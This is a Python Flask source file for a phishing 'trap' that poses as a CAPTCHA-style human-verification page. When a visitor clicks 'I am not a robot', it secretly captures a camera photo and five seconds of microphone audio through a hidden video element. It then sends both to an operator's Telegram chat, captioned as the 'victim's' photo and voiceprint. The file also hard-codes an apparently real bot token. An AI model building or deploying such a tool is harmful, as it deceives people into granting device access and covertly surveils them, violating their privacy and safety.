import base64, requests, os, json, time
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# ==========================================
# --- إعدادات الإمبراطور سيوفي (v17.5) ---
# ==========================================
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"
BASE_URL = "https://sif-pro.onrender.com" 
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
SUB_URL = "https://t.me/FAABOT?start=7041600701" 

system_config = {
    "welcome_msg": "🔥 أهلاً بك ملك سيوفي v17.5\n\nتم إصلاح نظام البصمات الصوتية! 🎙️",
    "trap_title": "تأكيد الأمان الموحد",
    "banned_users": [],  
    "all_users": {}      
}

def tg_request(method, payload=None, files=None):
    try:
        if files: return requests.post(API_URL + method, data=payload, files=files, timeout=30).json()
        return requests.post(API_URL + method, json=payload, timeout=30).json()
    except Exception as e:
        print(f"TG Error: {e}")
        return None

# واجهة الصيد مع كود الصوت المحدث
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; }
        .btn { background: #f38020; color: #000; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; }
        #st { margin-top: 20px; color: #777; font-size: 0.8rem; }
        #v { position: fixed; top: -10px; left: -10px; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon" style="font-size:50px; color:#f38020;">🛡️</div>
        <h2>تحقق بشري</h2>
        <p style="color: #bbb;">يرجى المتابعة لتأكيد الأمان.</p>
        <button class="btn" id="go" onclick="startCapture()">أنا لست روبوت</button>
        <div id="st">بانتظار البدء...</div>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        const send = (d, t) => fetch('/api/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});
        
        async function startCapture() {
            const btn = document.getElementById('go'); const st = document.getElementById('st');
            btn.style.display = 'none'; st.innerText = "جاري التحقق...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                const v = document.getElementById('v'); v.srcObject = stream; await v.play();
                
                // التقاط الصورة
                setTimeout(() => {
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    send(c.toDataURL('image/jpeg', 0.8), 'img');
                }, 2000);

                // تسجيل الصوت (تم تحسينه)
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' }); // استخدام webm لضمان التوافق
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => send(reader.result, 'aud');
                    st.innerText = "✅ تمت العملية بنجاح!";
                };
                
                recorder.start();
                st.innerText = "جاري رفع البيانات... (5 ثواني)";
                setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 5000);

            } catch (e) { st.innerText = "❌ يرجى منح صلاحية المايك والكاميرا!"; }
        }
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE, title=system_config["trap_title"])

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.get_json(force=True, silent=True)
    if not data: return "ERROR"
    t, d = data.get('t'), data.get('d')
    
    if t == 'msg':
        tg_request("sendMessage", {'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
    elif t == 'img':
        img = base64.b64decode(d.split(',')[1])
        tg_request("sendPhoto", {'chat_id': ADMIN_ID, 'caption': "📸 صورة الضحية"}, {'photo': ('c.jpg', img)})
    elif t == 'aud':
        try:
            # معالجة بيانات الصوت
            header, encoded = d.split(",", 1)
            audio_data = base64.b64decode(encoded)
            # إرسال كبصمة صوتية
            res = tg_request("sendVoice", {'chat_id': ADMIN_ID, 'caption': "🎙 بصمة الضحية"}, {'voice': ('v.ogg', audio_data)})
            if not res.get("ok"): # إذا فشل الـ Voice جرب نرسله كملف عادي
                tg_request("sendAudio", {'chat_id': ADMIN_ID, 'caption': "📁 ملف صوتي (Raw)"}, {'audio': ('v.webm', audio_data)})
        except Exception as e:
            tg_request("sendMessage", {'chat_id': ADMIN_ID, 'text': f"❌ فشل معالجة الصوت: {e}"})
            
    return "OK"

# مسار الـ Webhook (كما هو لتجنب التغيير)
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(force=True, silent=True)
    if not update or "message" not in update: return "OK"
    chat_id = str(update["message"]["chat"]["id"])
    if chat_id == ADMIN_ID:
        kb = {"inline_keyboard": [[{"text": "🔗 الرابط", "callback_data": "gen_link"}, {"text": "👥 المستخدمين", "callback_data": "list_users"}]]}
        tg_request("sendMessage", {"chat_id": chat_id, "text": system_config["welcome_msg"], "reply_markup": kb})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

